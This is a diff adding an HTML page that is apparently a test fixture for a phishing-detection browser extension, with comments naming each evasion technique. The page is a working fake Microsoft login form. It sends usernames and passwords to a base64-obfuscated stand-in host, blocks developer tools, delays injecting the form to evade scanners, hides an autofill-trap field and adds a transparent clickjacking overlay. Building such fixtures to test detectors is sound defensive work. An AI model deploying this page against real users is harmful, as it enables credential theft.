@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>System Maintenance - Security Verification Portal</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #111;
+      color: #eee;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden;
+    }
+
+    /* Loading Spinner State */
+    #spinner-container {
+      text-align: center;
+      transition: opacity 0.5s;
+    }
+    .spinner {
+      border: 4px solid rgba(255,255,255,0.1);
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      border-left-color: #3b82f6;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Hidden/Dynamic Form Container styling (applied after injection) */
+    .portal-box {
+      background: #1e1e1e;
+      border: 1px solid #333;
+      padding: 30px;
+      border-radius: 8px;
+      width: 320px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+    }
+    .input-field {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      background: #2a2a2a;
+      border: 1px solid #444;
+      color: #fff;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+    .btn {
+      width: 100%;
+      padding: 10px;
+      background: #3b82f6;
+      border: none;
+      color: white;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    /* Invisible clickjacking overlay (simulated) */
+    .clickjack-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 99999;
+      background: rgba(0, 0, 0, 0.01); /* almost completely transparent */
+      cursor: pointer;
+    }
+  </style>
+
+  <script>
+    // ── EVASION TECHNIQUE 1: Anti-Debugging & Inspector Blockers ─────────────
+    
+    // Disable standard inspection hotkeys
+    document.addEventListener('keydown', function(e) {
+      if (
+        e.key === 'F12' || 
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+        (e.ctrlKey && e.key === 'U')
+      ) {
+        e.preventDefault();
+        return false;
+      }
+    });
+
+    // Disable right-click context menu
+    document.addEventListener('contextmenu', e => e.preventDefault());
+
+    // Loop debugger statement to interrupt DevTools if opened
+    setInterval(function() {
+      const startTime = performance.now();
+      debugger; // Pauses execution if DevTools is open
+      if (performance.now() - startTime > 100) {
+        console.warn('Developer tools detected!');
+      }
+    }, 1000);
+
+    // ── EVASION TECHNIQUE 2: Obfuscated Javascript Strings ───────────────────
+    // Using atob (Base64 decoding) or charCode evaluations to construct actions
+    // This is flagged by check [15]
+    function getFormAction() {
+      const part1 = "aHR0cHM6Ly9mYWtlLXNlY3VyaXR5LXZlcmlmeS5uZXQ="; // fake-security-verify.net
+      const part2 = "L2NvbGxlY3QucGhw"; // /collect.php
+      return atob(part1) + atob(part2);
+    }
+  </script>
+</head>
+<body>
+
+  <!-- Loading State (Safe static footprint initially) -->
+  <div id="spinner-container">
+    <div class="spinner"></div>
+    <p>Loading Secure Verification Module...</p>
+  </div>
+
+  <!-- Container where form will be dynamically injected -->
+  <div id="dynamic-target"></div>
+
+  <!-- ── EVASION TECHNIQUE 3: Dynamic Element Injection (SPA bypass test) ────── -->
+  <script>
+    // Phishers delay form rendering to bypass initial scanners that only inspect static HTML
+    setTimeout(() => {
+      // Hide the loading state
+      document.getElementById('spinner-container').style.display = 'none';
+
+      // Create elements dynamically (this triggers the extension's MutationObserver)
+      const portal = document.createElement('div');
+      portal.className = 'portal-box';
+      
+      const title = document.createElement('h3');
+      title.textContent = 'Account Verification Required';
+      title.style.margin = '0 0 15px 0';
+      title.style.textAlign = 'center';
+
+      const desc = document.createElement('p');
+      desc.textContent = 'Verify your Microsoft Account to continue access.';
+      desc.style.fontSize = '12px';
+      desc.style.color = '#aaa';
+
+      const form = document.createElement('form');
+      form.method = 'POST';
+      // Obtain obfuscated action URL
+      form.action = getFormAction();
+
+      const userField = document.createElement('input');
+      userField.type = 'text';
+      userField.name = 'login_user';
+      userField.placeholder = 'Email, phone, or Skype';
+      userField.className = 'input-field';
+      userField.required = true;
+
+      // Sensitive password input loaded dynamically
+      const passField = document.createElement('input');
+      passField.type = 'password';
+      passField.name = 'login_password';
+      passField.placeholder = 'Password';
+      passField.className = 'input-field';
+      passField.required = true;
+
+      // ── EVASION TECHNIQUE 4: Zero-Opacity Honeypots ─────────────────────────
+      // Invisible fields to trap browser password autofills
+      const honeyField = document.createElement('input');
+      honeyField.type = 'text';
+      honeyField.name = 'card_ssn_holder';
+      honeyField.style.opacity = '0';
+      honeyField.style.position = 'absolute';
+      honeyField.style.height = '1px';
+      honeyField.style.width = '1px';
+      honeyField.style.zIndex = '-9';
+
+      const submitBtn = document.createElement('button');
+      submitBtn.type = 'submit';
+      submitBtn.className = 'btn';
+      submitBtn.textContent = 'Verify';
+
+      // Append everything
+      form.appendChild(userField);
+      form.appendChild(passField);
+      form.appendChild(honeyField);
+      form.appendChild(submitBtn);
+
+      portal.appendChild(title);
+      portal.appendChild(desc);
+      portal.appendChild(form);
+
+      // Inject dynamically into page (triggers MutationObserver)
+      document.getElementById('dynamic-target').appendChild(portal);
+
+      // ── EVASION TECHNIQUE 5: Clickjacking / Transparent overlay ─────────────
+      // Places a transparent layer over the viewport to intercept user events
+      const overlay = document.createElement('div');
+      overlay.className = 'clickjack-overlay';
+      overlay.addEventListener('click', () => {
+        console.log('Intercepted event');
+      });
+      document.body.appendChild(overlay);
+
+    }, 2000); // 2 second delay before injection
+  </script>
+
+</body>
+</html>
